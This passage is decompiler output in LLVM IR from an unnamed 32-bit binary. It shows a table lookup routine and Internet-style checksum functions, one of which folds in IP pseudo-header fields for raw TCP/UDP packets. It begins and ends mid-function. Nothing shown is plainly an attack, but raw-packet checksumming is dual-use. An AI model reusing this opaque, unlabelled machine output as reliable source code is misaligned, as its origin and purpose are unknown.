308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 213, 215, 214, 209, 210, 211, 212, 216, 217, 218, 219, 220, 221, 222, 223, 224, 243, 244, 245, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 276, 277, 246, 247, 248, 249, 250, 251, 260, 261, 252, 253, 254, 255, 256, 257, 258, 259, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 289, 290, 278, 279, 280, 281, 284, 285, 282, 283, 59, 56, 286, 287, 288, 298, 291, 292, 293, 294, 295, 296, 297, 299, 300, 301 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 13, 14, 15, 16, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 4, 5, 6, 3, 33, 7, 20, 21, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 23, 25, 24, 8, 26, 27, 28, 29, 30, 31, 32, 34, 39, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 98, 99, 100, 46, 47, 48, 49, 50, 51, 52, 53, 55, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 174, 175, 176, 177, 75, 76, 77, 78, 79, 80, 81, 82, 83, 85, 89, 86, 87, 88, 84, 90, 91, 92, 93, 94, 95, 96, 97, 150, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 162, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 163, 164, 165, 166, 167, 168, 169, 171, 170, 22, 172, 173 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 16, 17, 7, 8, 9, 10, 11, 12, 15, 18, 19, 20, 21, 22, 13, 14, 23, 33, 24, 25, 26, 27, 28, 29, 35, 61, 62, 30, 31, 32, 34, 36, 37, 38, 39, 40, 41, 44, 45, 42, 43, 46, 47, 48, 49, 50, 51, 52, 53, 54, 56, 57, 55, 58, 59, 60, 110, 111, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 112, 113, 114, 115, 116, 117, 118, 119, 120 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 27, 28, 29, 30, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 20, 21, 22, 23, 24, 25, 437, 15, 16, 17, 18, 19, 26, 27, 28, 29, 30, 31, 32, 33, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 34, 35, 36, 37, 61, 62, 63, 64, 65, 66, 67, 68, 69, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 106, 105, 60, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 151, 152, 164, 165, 153, 154, 155, 156, 167, 157, 158, 159, 160, 161, 162, 163, 166, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 211, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 201, 200, 202, 203, 204, 205, 206, 207, 208, 209, 210, 212, 213, 214, 215, 216, 217, 499, 500, 218, 496, 497, 498, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 219, 220, 221, 222, 236, 237, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 238, 239, 240, 241, 243, 244, 242, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 264, 265, 269, 270, 266, 267, 268, 262, 263, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 409, 410, 414, 411, 412, 413, 415, 416, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 457, 458, 459, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 432, 433, 430, 431, 434, 435, 436, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 485, 452, 453, 454, 455, 456, 486, 487, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 479, 480, 477, 478, 71, 70, 481, 482, 483, 484, 488, 489, 490, 491, 492, 493, 494, 495 }
  uselistorder i32 147, { 0, 7, 8, 9, 1, 10, 11, 12, 2, 13, 26, 3, 14, 15, 16, 4, 17, 18, 19, 5, 20, 21, 22, 23, 24, 27, 6, 25 }
  uselistorder i32 -1452, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 20740, { 1, 2, 3, 4, 0 }
  uselistorder i32 20612, { 1, 2, 0, 3 }
  uselistorder i32 10388, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 20900, { 4, 5, 6, 7, 8, 0, 3, 2, 9, 10, 11, 12, 1, 13, 14, 15, 16 }
  uselistorder i32 20916, { 2, 0, 15, 3, 4, 10, 8, 14, 13, 1, 16, 7, 17, 11, 5, 12, 6, 9, 18, 19, 20, 21 }
  uselistorder i8 47, { 0, 1, 3, 4, 2, 5, 7, 6 }
  uselistorder i32 3140, { 1, 2, 3, 4, 0 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_8055494.5 to i32), { 1, 0 }
  uselistorder i32 134566982, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_8049f6a, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8049ec7, { 1, 0 }
  uselistorder label %dec_label_pc_8049e86, { 1, 0 }
  uselistorder label %dec_label_pc_8049d1e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049ce8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049bbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049b86, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8049b6c, { 1, 0 }
  uselistorder label %dec_label_pc_8049b32, { 1, 0 }
  uselistorder label %dec_label_pc_8049a49, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049a11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80499f3, { 1, 0 }
  uselistorder label %dec_label_pc_80499d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80499c3, { 1, 0 }
  uselistorder label %dec_label_pc_804994e, { 1, 0 }
  uselistorder label %dec_label_pc_8049928, { 1, 0 }
  uselistorder label %dec_label_pc_80498ea, { 1, 0 }
  uselistorder label %dec_label_pc_80497f9, { 1, 0 }
  uselistorder label %dec_label_pc_804974f, { 1, 0 }
  uselistorder label %dec_label_pc_80496c3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80495d1, { 1, 0 }
  uselistorder label %dec_label_pc_804958e, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8049562, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8049550, { 1, 0 }
  uselistorder label %dec_label_pc_80494dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804949f, { 0, 1, 5, 2, 3, 4 }
  uselistorder label %dec_label_pc_8049468, { 1, 0 }
  uselistorder label %dec_label_pc_804930a, { 1, 0 }
  uselistorder label %dec_label_pc_8049301, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80492e4, { 1, 0 }
  uselistorder label %dec_label_pc_80492b2, { 1, 0 }
  uselistorder label %dec_label_pc_8049289, { 1, 0 }
  uselistorder label %dec_label_pc_804924d, { 1, 0 }
  uselistorder label %dec_label_pc_80491db, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80491b6, { 1, 0 }
  uselistorder label %dec_label_pc_8049124, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80490e1, { 1, 0 }
  uselistorder label %dec_label_pc_8049044, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049001, { 1, 0 }
  uselistorder label %dec_label_pc_8048f64, { 1, 0 }
  uselistorder label %dec_label_pc_8048f33, { 1, 0 }
  uselistorder label %dec_label_pc_8048ee1, { 1, 0 }
  uselistorder label %dec_label_pc_8048e4a, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048db9, { 1, 0 }
  uselistorder label %dec_label_pc_8048d91, { 7, 8, 2, 1, 9, 3, 10, 11, 12, 15, 0, 13, 14, 6, 4, 5 }
  uselistorder label %dec_label_pc_8048d58, { 1, 0 }
  uselistorder label %dec_label_pc_8048c28, { 1, 0 }
  uselistorder label %dec_label_pc_8048c10, { 1, 0 }
  uselistorder label %dec_label_pc_8048bb4, { 1, 0 }
  uselistorder label %dec_label_pc_8048ad8, { 1, 0 }
  uselistorder label %dec_label_pc_8048700, { 1, 0 }
  uselistorder label %dec_label_pc_8048601, { 1, 0 }
  uselistorder label %dec_label_pc_80485be, { 1, 0 }
  uselistorder label %dec_label_pc_8048582, { 0, 1, 2, 3, 4, 7, 6, 5, 8 }
  uselistorder label %dec_label_pc_804855f, { 1, 0 }
  uselistorder label %dec_label_pc_80484e5, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_80484e5.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804848a, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_804841e, { 1, 0 }
  uselistorder label %dec_label_pc_80482cc, { 1, 0 }
  uselistorder label %dec_label_pc_80482b8, { 1, 0 }
  uselistorder label %dec_label_pc_804825d, { 1, 2, 0, 3, 4 }
}

define i32 @function_804a0a0(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804a0a0:
  %tmp = trunc i32 %arg3 to i8
  %v4_804a0a5 = urem i32 %arg3, 256
  %v4_804a0b1 = zext i8 %arg1 to i32
  %v2_804a0b5 = icmp eq i8 %arg1, 0
  br i1 %v2_804a0b5, label %dec_label_pc_804a0e3, label %dec_label_pc_804a0c0

dec_label_pc_804a0c0:                             ; preds = %dec_label_pc_804a0a0
  %v3_804a0c4 = add i32 %arg2, 4
  %v4_804a0c4 = inttoptr i32 %v3_804a0c4 to i8*
  %v5_804a0c4 = load i8, i8* %v4_804a0c4, align 1
  %v16_804a0c4 = icmp eq i8 %tmp, %v5_804a0c4
  br i1 %v16_804a0c4, label %dec_label_pc_804a0eb, label %dec_label_pc_804a0c9

dec_label_pc_804a0c9:                             ; preds = %dec_label_pc_804a0c0
  br label %dec_label_pc_804a0de

dec_label_pc_804a0d0:                             ; preds = %dec_label_pc_804a0de
  %v1_804a0d0 = add i32 %v0_804a0d3.in, 12
  %v2_804a0d0 = inttoptr i32 %v1_804a0d0 to i8*
  %v3_804a0d0 = load i8, i8* %v2_804a0d0, align 1
  %v4_804a0d0 = zext i8 %v3_804a0d0 to i32
  %v6_804a0d0 = and i32 %v5_804a0d0, -256
  %v7_804a0d0 = or i32 %v4_804a0d0, %v6_804a0d0
  %v16_804a0d8 = icmp eq i8 %v3_804a0d0, %tmp
  br i1 %v16_804a0d8, label %dec_label_pc_804a0eb, label %dec_label_pc_804a0de

dec_label_pc_804a0de:                             ; preds = %dec_label_pc_804a0d0, %dec_label_pc_804a0c9
  %v5_804a0d0 = phi i32 [ %v7_804a0d0, %dec_label_pc_804a0d0 ], [ %v4_804a0a5, %dec_label_pc_804a0c9 ]
  %v0_804a0d3.in = phi i32 [ %v0_804a0d3, %dec_label_pc_804a0d0 ], [ %arg2, %dec_label_pc_804a0c9 ]
  %v0_804a0de = phi i32 [ %v1_804a0de, %dec_label_pc_804a0d0 ], [ 0, %dec_label_pc_804a0c9 ]
  %v0_804a0d3 = add i32 %v0_804a0d3.in, 8
  %v1_804a0de = add i32 %v0_804a0de, 1
  store i32 %v1_804a0de, i32* @ecx, align 4
  %v12_804a0df = icmp eq i32 %v1_804a0de, %v4_804a0b1
  %v1_804a0e1 = icmp eq i1 %v12_804a0df, false
  br i1 %v1_804a0e1, label %dec_label_pc_804a0d0, label %dec_label_pc_804a0e3

dec_label_pc_804a0e3:                             ; preds = %dec_label_pc_804a0de, %dec_label_pc_804a0a0
  ret i32 %arg4

dec_label_pc_804a0eb:                             ; preds = %dec_label_pc_804a0d0, %dec_label_pc_804a0c0
  %v0_804a0eb = phi i32 [ %arg2, %dec_label_pc_804a0c0 ], [ %v0_804a0d3, %dec_label_pc_804a0d0 ]
  %v1_804a0eb = inttoptr i32 %v0_804a0eb to i32*
  %v2_804a0eb = load i32, i32* %v1_804a0eb, align 4
  ret i32 %v2_804a0eb

; uselistorder directives
  uselistorder i32 %v1_804a0de, { 0, 2, 1 }
  uselistorder i32 %v0_804a0d3.in, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8 %arg1, { 1, 0 }
}

define i32 @function_804a600(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804a600:
  %v0_804a600 = load i32, i32* @edi, align 4
  %v0_804a601 = load i32, i32* @esi, align 4
  %v0_804a602 = load i32, i32* @ebx, align 4
  %v4_804a606 = zext i8 %arg1 to i32
  %v2_804a60e = icmp eq i8 %arg1, 0
  %v4_804a618 = urem i32 %arg3, 256
  %v5_804a618 = load i32, i32* @eax, align 4
  %v6_804a618 = and i32 %v5_804a618, -256
  %v7_804a618 = or i32 %v6_804a618, %v4_804a618
  br i1 %v2_804a60e, label %dec_label_pc_804a645, label %dec_label_pc_804a622

dec_label_pc_804a622:                             ; preds = %dec_label_pc_804a600
  %v1_804a622 = trunc i32 %arg3 to i8
  %v3_804a626 = add i32 %arg2, 4
  %v4_804a626 = inttoptr i32 %v3_804a626 to i8*
  %v5_804a626 = load i8, i8* %v4_804a626, align 1
  %v16_804a626 = icmp eq i8 %v1_804a622, %v5_804a626
  br i1 %v16_804a626, label %dec_label_pc_804a64c, label %dec_label_pc_804a62b

dec_label_pc_804a62b:                             ; preds = %dec_label_pc_804a622
  br label %dec_label_pc_804a640

dec_label_pc_804a632:                             ; preds = %dec_label_pc_804a640
  %v1_804a632 = add i32 %v0_804a635.in, 12
  %v2_804a632 = inttoptr i32 %v1_804a632 to i8*
  %v3_804a632 = load i8, i8* %v2_804a632, align 1
  %v4_804a632 = zext i8 %v3_804a632 to i32
  %v6_804a632 = and i32 %v5_804a632, -256
  %v7_804a632 = or i32 %v4_804a632, %v6_804a632
  %v16_804a63a = icmp eq i8 %v1_804a622, %v3_804a632
  br i1 %v16_804a63a, label %dec_label_pc_804a64c, label %dec_label_pc_804a640

dec_label_pc_804a640:                             ; preds = %dec_label_pc_804a632, %dec_label_pc_804a62b
  %v5_804a632 = phi i32 [ %v7_804a632, %dec_label_pc_804a632 ], [ %v7_804a618, %dec_label_pc_804a62b ]
  %v0_804a635.in = phi i32 [ %v0_804a635, %dec_label_pc_804a632 ], [ %arg2, %dec_label_pc_804a62b ]
  %v0_804a640 = phi i32 [ %v1_804a640, %dec_label_pc_804a632 ], [ 0, %dec_label_pc_804a62b ]
  %v0_804a635 = add i32 %v0_804a635.in, 8
  %v1_804a640 = add i32 %v0_804a640, 1
  store i32 %v1_804a640, i32* @ecx, align 4
  %v12_804a641 = icmp eq i32 %v4_804a606, %v1_804a640
  %v1_804a643 = icmp eq i1 %v12_804a641, false
  br i1 %v1_804a643, label %dec_label_pc_804a632, label %dec_label_pc_804a645

dec_label_pc_804a645:                             ; preds = %dec_label_pc_804a640, %dec_label_pc_804a64c, %dec_label_pc_804a600
  store i32 %v0_804a602, i32* @ebx, align 4
  store i32 %v0_804a601, i32* @esi, align 4
  store i32 %v0_804a600, i32* @edi, align 4
  ret i32 %arg4

dec_label_pc_804a64c:                             ; preds = %dec_label_pc_804a632, %dec_label_pc_804a622
  %v0_804a64c = phi i32 [ %arg2, %dec_label_pc_804a622 ], [ %v0_804a635, %dec_label_pc_804a632 ]
  %v1_804a64c = inttoptr i32 %v0_804a64c to i32*
  %v2_804a64c = load i32, i32* %v1_804a64c, align 4
  %sext = mul i32 %v2_804a64c, 16777216
  %v2_804a64e = icmp eq i32 %sext, 0
  br i1 %v2_804a64e, label %dec_label_pc_804a645, label %dec_label_pc_804a652

dec_label_pc_804a652:                             ; preds = %dec_label_pc_804a64c
  store i32 %v0_804a602, i32* @ebx, align 4
  store i32 %v0_804a601, i32* @esi, align 4
  store i32 %v0_804a600, i32* @edi, align 4
  %v2_804a662 = sdiv i32 %sext, 16777216
  %v3_804a662 = inttoptr i32 %v2_804a662 to i8*
  %v4_804a662 = call i32 @function_80526e0(i8* %v3_804a662, i32 10)
  ret i32 %v4_804a662

; uselistorder directives
  uselistorder i32 %v1_804a640, { 0, 2, 1 }
  uselistorder i32 %v0_804a635.in, { 1, 0 }
  uselistorder i32 %v0_804a602, { 1, 0 }
  uselistorder i32 %v0_804a601, { 1, 0 }
  uselistorder i32 %v0_804a600, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804a645, { 1, 0, 2 }
}

define i32 @function_804de40() local_unnamed_addr {
dec_label_pc_804de40:
  %tmp = call i16* @__decompiler_undefined_function_4()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v4_804de47 = ptrtoint i16* %tmp to i32
  %tmp14 = or i32 %tmp11, 1
  %tmp15 = icmp eq i32 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_804de65, label %dec_label_pc_804de50

dec_label_pc_804de50:                             ; preds = %dec_label_pc_804de40, %dec_label_pc_804de50
  %v0_804de5e = phi i32 [ %v2_804de5e, %dec_label_pc_804de50 ], [ 0, %dec_label_pc_804de40 ]
  %v0_804de53 = phi i32 [ %v1_804de53, %dec_label_pc_804de50 ], [ %tmp11, %dec_label_pc_804de40 ]
  %v0_804de5b = phi i32 [ %v1_804de5b, %dec_label_pc_804de50 ], [ %v4_804de47, %dec_label_pc_804de40 ]
  %v1_804de50 = inttoptr i32 %v0_804de5b to i16*
  %v2_804de50 = load i16, i16* %v1_804de50, align 2
  %v3_804de50 = zext i16 %v2_804de50 to i32
  %v1_804de53 = add i32 %v0_804de53, -2
  %v1_804de5b = add i32 %v0_804de5b, 2
  %v2_804de5e = add i32 %v3_804de50, %v0_804de5e
  %v5_804de60 = icmp eq i32 %v1_804de53, 0
  %v9_804de60 = icmp eq i32 %v0_804de53, 3
  %v2_804de63 = or i1 %v9_804de60, %v5_804de60
  br i1 %v2_804de63, label %dec_label_pc_804de65.loopexit, label %dec_label_pc_804de50

dec_label_pc_804de65.loopexit:                    ; preds = %dec_label_pc_804de50
  br label %dec_label_pc_804de65

dec_label_pc_804de65:                             ; preds = %dec_label_pc_804de65.loopexit, %dec_label_pc_804de40
  %v0_804de6b = phi i32 [ %v2_804de5e, %dec_label_pc_804de65.loopexit ], [ 0, %dec_label_pc_804de40 ]
  %v0_804de68 = phi i32 [ %v1_804de5b, %dec_label_pc_804de65.loopexit ], [ %v4_804de47, %dec_label_pc_804de40 ]
  %v0_804de65 = phi i32 [ %v1_804de53, %dec_label_pc_804de65.loopexit ], [ %tmp11, %dec_label_pc_804de40 ]
  %v8_804de65 = icmp eq i32 %v0_804de65, 1
  %v1_804de66 = icmp eq i1 %v8_804de65, false
  br i1 %v1_804de66, label %dec_label_pc_804de6d, label %dec_label_pc_804de68

dec_label_pc_804de68:                             ; preds = %dec_label_pc_804de65
  %v1_804de68 = inttoptr i32 %v0_804de68 to i8*
  %v2_804de68 = load i8, i8* %v1_804de68, align 1
  %v3_804de68 = sext i8 %v2_804de68 to i32
  %v2_804de6b = add i32 %v3_804de68, %v0_804de6b
  br label %dec_label_pc_804de6d

dec_label_pc_804de6d:                             ; preds = %dec_label_pc_804de65, %dec_label_pc_804de68
  %v0_804de6d = phi i32 [ %v0_804de6b, %dec_label_pc_804de65 ], [ %v2_804de6b, %dec_label_pc_804de68 ]
  %v1_804de6f = urem i32 %v0_804de6d, 65536
  %v2_804de72 = udiv i32 %v0_804de6d, 65536
  %v2_804de76 = add nuw nsw i32 %v1_804de6f, %v2_804de72
  %v2_804de7a = udiv i32 %v2_804de76, 65536
  %v2_804de7d = add nuw nsw i32 %v2_804de7a, %v2_804de76
  %v1_804de7f = urem i32 %v2_804de7d, 65536
  %v1_804de82 = xor i32 %v1_804de7f, 65535
  ret i32 %v1_804de82

; uselistorder directives
  uselistorder i32 %v2_804de76, { 1, 0 }
  uselistorder i32 %v0_804de6b, { 1, 0 }
  uselistorder i32 %v1_804de53, { 0, 2, 1 }
  uselistorder i32 %v4_804de47, { 1, 0 }
  uselistorder i32 %tmp11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804de6d, { 1, 0 }
  uselistorder label %dec_label_pc_804de50, { 1, 0 }
}

define i32 @function_804de90() local_unnamed_addr {
dec_label_pc_804de90:
  %tmp14 = call i16* @__decompiler_undefined_function_4()
  %tmp15 = call i16 @__decompiler_undefined_function_1()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %v4_804dea5 = ptrtoint i16* %tmp14 to i32
  %v1_804deae = add i32 %tmp17, 12
  %v2_804deae = inttoptr i32 %v1_804deae to i32*
  %v3_804deae = load i32, i32* %v2_804deae, align 4
  %v1_804deb1 = add i32 %tmp17, 16
  %v2_804deb1 = inttoptr i32 %v1_804deb1 to i32*
  %v3_804deb1 = load i32, i32* %v2_804deb1, align 4
  %v7_804deb7 = icmp sgt i32 %tmp16, 1
  br i1 %v7_804deb7, label %dec_label_pc_804dec0, label %dec_label_pc_804ded5

dec_label_pc_804dec0:                             ; preds = %dec_label_pc_804de90, %dec_label_pc_804dec0
  %v0_804dece = phi i32 [ %v2_804dece, %dec_label_pc_804dec0 ], [ 0, %dec_label_pc_804de90 ]
  %v0_804dec3 = phi i32 [ %v1_804dec3, %dec_label_pc_804dec0 ], [ %tmp16, %dec_label_pc_804de90 ]
  %v0_804decb = phi i32 [ %v1_804decb, %dec_label_pc_804dec0 ], [ %v4_804dea5, %dec_label_pc_804de90 ]
  %v1_804dec0 = inttoptr i32 %v0_804decb to i16*
  %v2_804dec0 = load i16, i16* %v1_804dec0, align 2
  %v3_804dec0 = zext i16 %v2_804dec0 to i32
  %v1_804dec3 = add i32 %v0_804dec3, -2
  %v1_804decb = add i32 %v0_804decb, 2
  %v2_804dece = add i32 %v3_804dec0, %v0_804dece
  %v1_804ded0 = add i32 %v0_804dec3, -3
  %v6_804ded0 = sub i32 2, %v0_804dec3
  %v7_804ded0 = and i32 %v1_804dec3, %v6_804ded0
  %v8_804ded0 = icmp slt i32 %v7_804ded0, 0
  %v9_804ded0 = icmp eq i32 %v1_804ded0, 0
  %v10_804ded0 = icmp slt i32 %v1_804ded0, 0
  %v3_804ded3 = icmp eq i1 %v10_804ded0, %v8_804ded0
  %v4_804ded3 = icmp eq i1 %v9_804ded0, false
  %v5_804ded3 = and i1 %v4_804ded3, %v3_804ded3
  br i1 %v5_804ded3, label %dec_label_pc_804dec0, label %dec_label_pc_804ded5.loopexit

dec_label_pc_804ded5.loopexit:                    ; preds = %dec_label_pc_804dec0
  br label %dec_label_pc_804ded5

dec_label_pc_804ded5:                             ; preds = %dec_label_pc_804ded5.loopexit, %dec_label_pc_804de90
  %v0_804df40 = phi i32 [ %v2_804dece, %dec_label_pc_804ded5.loopexit ], [ 0, %dec_label_pc_804de90 ]
  %v0_804df3e = phi i32 [ %v1_804decb, %dec_label_pc_804ded5.loopexit ], [ %v4_804dea5, %dec_label_pc_804de90 ]
  %v0_804ded5 = phi i32 [ %v1_804dec3, %dec_label_pc_804ded5.loopexit ], [ %tmp16, %dec_label_pc_804de90 ]
  %v8_804ded5 = icmp eq i32 %v0_804ded5, 1
  br i1 %v8_804ded5, label %dec_label_pc_804df3c, label %dec_label_pc_804ded8

dec_label_pc_804ded8:                             ; preds = %dec_label_pc_804ded5, %dec_label_pc_804df3c
  %v0_804dee6 = phi i32 [ %v0_804df40, %dec_label_pc_804ded5 ], [ %v2_804df40, %dec_label_pc_804df3c ]
  %v2_804dedc = udiv i32 %v3_804deb1, 65536
  %v1_804dedf = add i32 %tmp17, 9
  %v2_804dedf = inttoptr i32 %v1_804dedf to i8*
  %v3_804dedf = load i8, i8* %v2_804dedf, align 1
  %v1_804dee2 = zext i8 %v3_804dedf to i16
  %v2_804dee2 = call i16 @llvm.bswap.i16(i16 %v1_804dee2)
  %v3_804dee2 = zext i16 %v2_804dee2 to i32
  %v2_804dee6 = add i32 %v0_804dee6, %v2_804dedc
  %v2_804deee = add i32 %v2_804dee6, %v3_804dee2
  %v1_804def4 = urem i32 %v3_804deae, 65536
  %v2_804defa = udiv i32 %v3_804deae, 65536
  %v1_804df01 = urem i32 %v3_804deb1, 65536
  %v4_804df09 = zext i16 %tmp15 to i32
  %v2_804defd = add nuw nsw i32 %v2_804defa, %v4_804df09
  %v2_804df07 = add nuw nsw i32 %v2_804defd, %v1_804def4
  %v2_804df14 = add nuw nsw i32 %v2_804df07, %v1_804df01
  %v2_804df16 = add i32 %v2_804df14, %v2_804deee
  %tmp = icmp ult i32 %v2_804df16, 65536
  br i1 %tmp, label %dec_label_pc_804df2e, label %dec_label_pc_804df20

dec_label_pc_804df20:                             ; preds = %dec_label_pc_804ded8, %dec_label_pc_804df20
  %v2_804df253 = phi i32 [ %v2_804df25, %dec_label_pc_804df20 ], [ %v2_804df16, %dec_label_pc_804ded8 ]
  %v2_804df294.in = phi i32 [ %v2_804df25, %dec_label_pc_804df20 ], [ %v2_804df16, %dec_label_pc_804ded8 ]
  %v2_804df294 = udiv i32 %v2_804df294.in, 65536
  %v1_804df20 = urem i32 %v2_804df253, 65536
  %v2_804df25 = add nuw nsw i32 %v1_804df20, %v2_804df294
  %tmp25 = icmp ult i32 %v2_804df25, 65536
  %v1_804df2c = icmp eq i1 %tmp25, false
  br i1 %v1_804df2c, label %dec_label_pc_804df20, label %dec_label_pc_804df2e.loopexit

dec_label_pc_804df2e.loopexit:                    ; preds = %dec_label_pc_804df20
  br label %dec_label_pc_804df2e

dec_label_pc_804df2e:                             ; preds = %dec_label_pc_804df2e.loopexit, %dec_label_pc_804ded8
  %v0_804df2e = phi i32 [ %v2_804df25, %dec_label_pc_804df2e.loopexit ], [ %v2_804df16, %dec_label_pc_804ded8 ]
  %v1_804df2e = urem i32 %v0_804df2e, 65536
  %v1_804df32 = xor i32 %v1_804df2e, 65535
  ret i32 %v1_804df32

dec_label_pc_804df3c:                             ; preds = %dec_label_pc_804ded5
  %v1_804df3e = inttoptr i32 %v0_804df3e to i8*
  %v2_804df3e = load i8, i8* %v1_804df3e, align 1
  %v3_804df3e = zext i8 %v2_804df3e to i32
  %v2_804df40 = add i32 %v3_804df3e, %v0_804df40
  br label %dec_label_pc_804ded8

; uselistorder directives
  uselistorder i32 %v2_804df25, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804df16, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804ded0, { 1, 0 }
  uselistorder i32 %v1_804dec3, { 0, 2, 1 }
  uselistorder i32 %v3_804deb1, { 1, 0 }
  uselistorder i32 %v4_804dea5, { 1, 0 }
  uselistorder i32 %tmp17, { 0, 2, 1 }
  uselistorder i32 %tmp16, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804df20, { 1, 0 }
  uselistorder label %dec_label_pc_804ded8, { 1, 0 }
  uselistorder label %dec_label_pc_804dec0, { 1, 0 }
}

define i32 @function_804df70(i32 %arg1) local_unnamed_addr {
dec_label_pc_804df70:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp47 = call i8 @__decompiler_undefined_function_3()
  %tmp51 = call i8 @__decompiler_undefined_function_3()
